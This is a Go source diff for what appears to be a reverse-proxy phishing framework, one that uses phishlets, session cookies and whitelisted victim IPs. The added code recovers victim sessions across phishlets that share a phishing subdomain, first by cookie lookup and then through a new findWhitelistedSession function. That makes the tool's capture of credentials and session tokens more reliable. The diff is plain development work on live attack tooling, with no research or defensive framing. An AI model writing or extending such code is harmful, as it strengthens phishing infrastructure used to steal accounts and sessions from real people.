@@ -371,6 +371,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     var create_session bool = true
                     var ok bool = false
                     sc, err := req.Cookie(session_cookie)
+                    // Cross-phishlet cookie recovery: if the expected cookie wasn't found,
+                    // scan other enabled phishlets. This handles the case where two phishlets
+                    // share a phish subdomain and getPhishletByPhishHost picked the wrong one.
+                    if err != nil {
+                        for altSite := range p.cfg.phishlets {
+                            if altSite == pl_name || !p.cfg.IsSiteEnabled(altSite) {
+                                continue
+                            }
+                            altCk := getSessionCookieName(altSite, p.cookieName)
+                            if altSc, altErr := req.Cookie(altCk); altErr == nil {
+                                if _, hasSid := p.sids[altSc.Value]; hasSid {
+                                    if altPl, plErr := p.cfg.GetPhishlet(altSite); plErr == nil {
+                                        pl = altPl
+                                        pl_name = altSite
+                                        ps.PhishletName = pl_name
+                                        session_cookie = altCk
+                                        sc = altSc
+                                        err = nil
+                                    }
+                                    break
+                                }
+                            }
+                        }
+                    }
                     if err == nil {
                         ps.Index, ok = p.sids[sc.Value]
                         if ok {
@@ -401,6 +425,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
                             create_session = false
                             req_ok = true
+                        } else if l == nil {
+                            // Whitelist fallback: check all phishlets for this IP.
+                            // Recovers in-progress sessions when the wrong phishlet was
+                            // resolved from a shared subdomain (cookie not yet set in browser).
+                            if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
+                                pl = wlPl
+                                pl_name = wlPl.Name
+                                ps.PhishletName = pl_name
+                                ps.SessionId = wlSid
+                                if idx, ok2 := p.sids[wlSid]; ok2 {
+                                    ps.Index = idx
+                                }
+                                create_session = false
+                                req_ok = true
+                            }
                         }
                     }
 
@@ -2446,6 +2485,29 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
         return ct.Before(et)
     }
     return false
+}
+
+// findWhitelistedSession returns the session ID and phishlet for the first
+// active whitelist entry for ip_addr, scanning across all phishlets.
+// Use this as a fallback when isWhitelistedIP fails because the wrong
+// phishlet was resolved from a shared phish subdomain.
+func (p *HttpProxy) findWhitelistedSession(ip_addr string) (string, *Phishlet) {
+    p.ip_mtx.Lock()
+    defer p.ip_mtx.Unlock()
+
+    ct := time.Now()
+    prefix := ip_addr + "-"
+    for key, exp := range p.ip_whitelist {
+        if strings.HasPrefix(key, prefix) && ct.Before(time.Unix(exp, 0)) {
+            if sid, ok := p.ip_sids[key]; ok {
+                plName := strings.TrimPrefix(key, prefix)
+                if pl, err := p.cfg.GetPhishlet(plName); err == nil {
+                    return sid, pl
+                }
+            }
+        }
+    }
+    return "", nil
 }
 
 func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
